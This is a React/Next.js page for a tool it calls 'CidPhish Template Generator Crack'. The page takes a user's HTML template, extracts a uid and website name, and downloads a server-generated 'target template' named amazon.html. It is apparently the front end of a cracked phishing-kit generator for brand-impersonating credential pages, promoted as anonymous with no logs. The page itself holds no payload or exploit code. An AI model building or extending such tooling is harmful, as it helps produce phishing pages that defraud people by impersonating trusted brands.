"use client";
import { useState, useEffect } from "react";

export default function Home() {
  const [templates, setTemplates] = useState<string[]>([]);
  const [selectedTemplate, setSelectedTemplate] = useState("");
  const [htmlInput, setHtmlInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationResult, setVerificationResult] = useState<{
    isValid: boolean;
    message: string;
  } | null>(null);
  const [extractedData, setExtractedData] = useState<{
    uid: string;
    websiteName: string;
  } | null>(null);

  // Fetch templates on component mount
  useEffect(() => {
    fetchTemplates();
  }, []);

  // Auto-verify when HTML input changes
  useEffect(() => {
    if (htmlInput.trim()) {
      const timeoutId = setTimeout(() => {
        verifyTemplate();
      }, 500); // Debounce for 500ms

      return () => clearTimeout(timeoutId);
    } else {
      setVerificationResult(null);
      setExtractedData(null);
    }
  }, [htmlInput]);

  const fetchTemplates = async () => {
    try {
      const response = await fetch('/api/v1/template');
      const data = await response.json();
      
      if (data.success) {
        setTemplates(data.templates);
      } else {
        console.error('Failed to fetch templates:', data.error);
      }
    } catch (error) {
      console.error('Error fetching templates:', error);
    }
  };

  const extractUidAndWebsiteName = (htmlString: string) => {
    const uidMatch = htmlString.match(/const uid = "([^"]+)";/);
    const websiteNameMatch = htmlString.match(/const websiteName = "([^"]+)";/);
    
    return {
      uid: uidMatch ? uidMatch[1] : null,
      websiteName: websiteNameMatch ? websiteNameMatch[1] : null
    };
  };

  const verifyTemplate = () => {
    setIsVerifying(true);
    
    setTimeout(() => {
      const extracted = extractUidAndWebsiteName(htmlInput);
      
      if (extracted.uid && extracted.websiteName) {
        setVerificationResult({
          isValid: true,
          message: "Template verified successfully! Ready for generation."
        });
        setExtractedData({
          uid: extracted.uid,
          websiteName: extracted.websiteName
        });
      } else {
        setVerificationResult({
          isValid: false,
          message: "Invalid template format. Please check your HTML structure."
        });
        setExtractedData(null);
      }
      
      setIsVerifying(false);
    }, 300);
  };

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.type === 'text/html') {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target?.result as string;
        setHtmlInput(content);
      };
      reader.readAsText(file);
    } else {
      alert('Please select a valid HTML file');
    }
  };

  const generateTemplate = async () => {
    if (!selectedTemplate || !extractedData) {
      alert('Please select a template and ensure your HTML is verified');
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch('/api/v1/template', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          templateName: selectedTemplate,
          uid: extractedData.uid,
          websiteName: extractedData.websiteName
        })
      });

      if (response.ok) {
        // Get the HTML content as blob
        const blob = await response.blob();
        
        // Create download link with amazon filename
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = `amazon.html`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        // Show success message without revealing details
        alert('File generated and downloaded successfully!');
      } else {
        const errorData = await response.json();
        alert(`Generation failed. Please try again.`);
      }
    } catch (error) {
      console.error('Error generating template:', error);
      alert('Generation failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const clearAll = () => {
    setSelectedTemplate("");
    setHtmlInput("");
    setVerificationResult(null);
    setExtractedData(null);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white p-4">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <header className="text-center py-8 border-b border-gray-700">
          <h1 className="text-5xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 mb-4">
            CidPhish Template Generator Crack
          </h1>
          <p className="text-gray-300 text-lg">
            Secure • Anonymous • No Logs
          </p>
        </header>

        {/* Main Content */}
        <main className="py-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            {/* Left Side - HTML Upload */}
            <div className="space-y-6">
              <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
                <h2 className="text-2xl font-semibold mb-4 text-orange-400">
                  📤 Upload Source Template
                </h2>
                
                {/* File Upload */}
                <div className="mb-4">
                  <label className="block text-sm font-medium mb-2 text-gray-300">
                    Select HTML File:
                  </label>
                  <input
                    type="file"
                    accept=".html,.htm"
                    onChange={handleFileUpload}
                    className="w-full p-2 bg-gray-700 border border-gray-600 rounded-md text-white file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:bg-orange-500 file:text-white hover:file:bg-orange-600"
                  />
                </div>

                {/* Text Area */}
                <div className="mb-4">
                  <label className="block text-sm font-medium mb-2 text-gray-300">
                    Or paste HTML content:
                  </label>
                  <textarea
                    value={htmlInput}
                    onChange={(e) => setHtmlInput(e.target.value)}
                    placeholder="Paste your HTML content here..."
                    className="w-full h-64 p-3 bg-gray-700 border border-gray-600 rounded-md text-white placeholder-gray-400 font-mono text-sm resize-none focus:ring-2 focus:ring-orange-500 focus:border-transparent"
                  />
                </div>

                {/* Auto-Verification Status */}
                {isVerifying && (
                  <div className="p-4 rounded-md bg-blue-800 border border-blue-600 mb-4">
                    <div className="flex items-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span>Analyzing template...</span>
                    </div>
                  </div>
                )}

                {/* Verification Result */}
                {verificationResult && !isVerifying && (
                  <div className={`p-4 rounded-md ${verificationResult.isValid ? 'bg-green-800 border border-green-600' : 'bg-red-800 border border-red-600'}`}>
                    <div className="flex items-center mb-2">
                      <span className="text-lg mr-2">
                        {verificationResult.isValid ? '✅' : '❌'}
                      </span>
                      <span className="font-semibold">
                        {verificationResult.isValid ? 'Template Valid' : 'Template Invalid'}
                      </span>
                    </div>
                    <p className="text-sm">{verificationResult.message}</p>
                  </div>
                )}

                {/* Clear Button */}
                <button
                  onClick={clearAll}
                  className="w-full mt-4 bg-gray-600 hover:bg-gray-700 text-white font-semibold py-3 px-6 rounded-md transition-colors duration-200"
                >
                  🗑️ Clear All
                </button>
              </div>
            </div>

            {/* Right Side - Template Selection */}
            <div className="space-y-6">
              <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
                <h2 className="text-2xl font-semibold mb-4 text-green-400">
                  🎯 Select Target Template
                </h2>
                
                {/* Show templates only if verification is successful */}
                {verificationResult?.isValid ? (
                  <>
                    {/* Template Selection */}
                    <div className="mb-6">
                      <label className="block text-sm font-medium mb-2 text-gray-300">
                        Choose Target Template:
                      </label>
                      <select
                        value={selectedTemplate}
                        onChange={(e) => setSelectedTemplate(e.target.value)}
                        className="w-full p-3 bg-gray-700 border border-gray-600 rounded-md text-white focus:ring-2 focus:ring-green-500 focus:border-transparent"
                      >
                        <option value="">Select a template...</option>
                        {templates.map((template) => (
                          <option key={template} value={template}>
                            {template.charAt(0).toUpperCase() + template.slice(1)}
                          </option>
                        ))}
                      </select>
                    </div>

                    {/* Available Templates Grid */}
                    <div className="mb-6 p-4 bg-gray-900 rounded-md">
                      <h3 className="text-lg font-semibold mb-3 text-cyan-400">
                        Available Templates ({templates.length})
                      </h3>
                      <div className="grid grid-cols-2 gap-2">
                        {templates.map((template) => (
                          <div
                            key={template}
                            className={`p-3 rounded text-center text-sm transition-colors cursor-pointer ${
                              selectedTemplate === template
                                ? 'bg-green-600 text-white'
                                : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
                            }`}
                            onClick={() => setSelectedTemplate(template)}
                          >
                            {template.charAt(0).toUpperCase() + template.slice(1)}
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Generate Button */}
                    <button
                      onClick={generateTemplate}
                      disabled={!selectedTemplate || isLoading}
                      className="w-full bg-gradient-to-r from-green-500 to-blue-500 hover:from-green-600 hover:to-blue-600 disabled:from-gray-600 disabled:to-gray-700 text-white font-semibold py-4 px-6 rounded-md transition-all duration-200 disabled:cursor-not-allowed"
                    >
                      {isLoading ? (
                        <span className="flex items-center justify-center">
                          <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                          </svg>
                          Generating...
                        </span>
                      ) : (
                        "⚡ GENERATE & DOWNLOAD"
                      )}
                    </button>
                  </>
                ) : (
                  <div className="text-center py-12">
                    <div className="text-6xl mb-4">🔒</div>
                    <h3 className="text-xl font-semibold mb-2 text-gray-400">
                      Upload Required
                    </h3>
                    <p className="text-gray-500">
                      Please upload and verify a valid HTML template to access generation features.
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="mt-8 bg-gray-800 rounded-lg p-6 border border-gray-700">
            <h3 className="text-lg font-semibold mb-3 text-cyan-400">
              🔐 No Data is Stored In This Website
            </h3>
          </div>
        </main>

        {/* Footer */}
        <footer className="text-center py-6 border-t border-gray-700 mt-8">
          <p className="text-gray-400">
            CidPhish Template Generator Crack v1.0 | Secure & Private
          </p>
        </footer>
      </div>
    </div>
  );
}